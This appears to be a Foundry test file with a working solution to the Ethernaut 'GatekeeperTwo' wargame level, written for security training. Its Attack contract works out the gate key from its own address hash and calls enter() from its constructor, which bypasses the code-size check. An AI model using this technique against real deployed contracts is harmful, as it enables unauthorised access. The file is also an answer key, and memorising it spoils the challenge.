// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../src/14_GatekeeperTwo.sol";

contract Attack {
    constructor(GatekeeperTwo target) {
        bytes8 key = bytes8(
            uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
            ^ type(uint64).max
        );
        target.enter(key);
    }
}

contract TestGatekeeperTwo is Test {
    address public player = address(0xbad);
    GatekeeperTwo public instance;

    function setUp() public {
        vm.deal(player, 0.001 ether);
        instance = new GatekeeperTwo();
    }

    function testSolution() public {
        vm.startPrank(player);

        // Your exploit goes here
        new Attack(instance);

        vm.stopPrank();
        assertNotEq(instance.entrant(), address(0));
    }
}
